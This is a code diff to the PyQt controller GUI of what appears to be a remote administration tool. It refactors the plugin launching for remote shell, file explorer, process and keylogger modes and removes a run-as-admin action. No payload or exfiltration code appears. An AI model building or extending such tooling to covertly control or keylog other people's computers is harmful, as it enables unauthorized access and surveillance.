@@ -86,7 +86,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
         # plugins bank
         self.pluginsBank = {}
-        self.current_sock = ''
 
         # disable panel buttons
         self.actionRemote_Shell.setDisabled(True)
@@ -152,7 +151,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.actionLock_Client.triggered.connect(self.lock_client)
         self.actionStop_Client.triggered.connect(self.terminate_client)
         self.actionSet_Alias.triggered.connect(self.add_alias)
-        self.actionRun_As_Admin.triggered.connect(self.run_as_admin)
+        #self.actionRun_As_Admin.triggered.connect(self.run_as_admin)
         ###
         self.actionRemote_Shell.triggered.connect(lambda: self.run_plugin('shellMode'))
         self.actionRemote_Explorer.triggered.connect(lambda: self.run_plugin('explorerMode'))
@@ -848,13 +847,12 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if self.clientsTable.selectedItems():
 
             server_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')), _('RM_SET_ALIAS'), self.add_alias)
-            server_menu.addAction(QIcon(os.path.join(assets, 'run_as_admin.png')), _('RM_RUN_AS_ADMIN'),
-                                  self.run_as_admin)
+            #server_menu.addAction(QIcon(os.path.join(assets, 'run_as_admin.png')), _('RM_RUN_AS_ADMIN'), self.run_as_admin)
             server_menu.addSeparator()
 
             if self.clientsTable.item(server_index, self.index_of_lock).text() == _('INFO_UNLOCKED'):
                 server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), _('RM_SHELL'),
-                                      lambda: self.run_plugin('shellMode'))
+                                      lambda: self.execute_plugin('shell'))
                 server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), _('RM_EXPLORER'),
                                       lambda: self.run_plugin('explorerMode'))
                 server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), _('RM_PROCESSES'),
@@ -907,19 +905,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         except AttributeError:
             return False
 
-    def send_run_signal(self, sock, signal):
-        signals = {
-            'shellMode': 'executeShell()',
-            'explorerMode': 'executeExplorer()',
-            'audioMode': 'executeAudio()',
-            'keyloggerMode': 'executeKeylogger()',
-            'scriptingMode': 'executeScripting()',
-            'processesMode': 'executeProcesses()',
-        }
-        if signal in signals:
-            self.current_sock = sock
-            self.emit(SIGNAL(signals[signal]))
-
     def execute_plugin(self, plugin):
         plugins = {
             'shell': mshell,
@@ -933,9 +918,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         client = self.current_client()
         if client:
             args = {
-                'sock': self.current_sock,
-                'key': self.socks[client]['key'],
-                'ipAddress': self.socks[client]['ip_address'],
+                'sock': self.connection_socket,
+                'client': client,
+                'session_id': self.session_id,
                 'assets': assets,
             }
             plugin_id = id_generator()
@@ -950,11 +935,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             if ok:
                 data_send(self.connection_socket, '%s %s' % (client, str(text)), 'setAlias', self.session_id)
 
-    def run_as_admin(self):
-        client = self.current_client()
-        if client:
-            get(self.connection_socket, 'runasadmin', client)
-
     def terminate_client(self):
         client = self.current_client()
         if client:
@@ -963,11 +943,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             ans = warn.exec_()
             if ans == QMessageBox.Yes:
                 send(self.connection_socket, 'terminateServer', str(client))
-
-    def run_plugin(self, mode):
-        client = self.current_client()
-        if client:
-            get(client, 'startChildSocket %s' % client, mode)
 
     def update_settings(self):
         self.settings = Config()
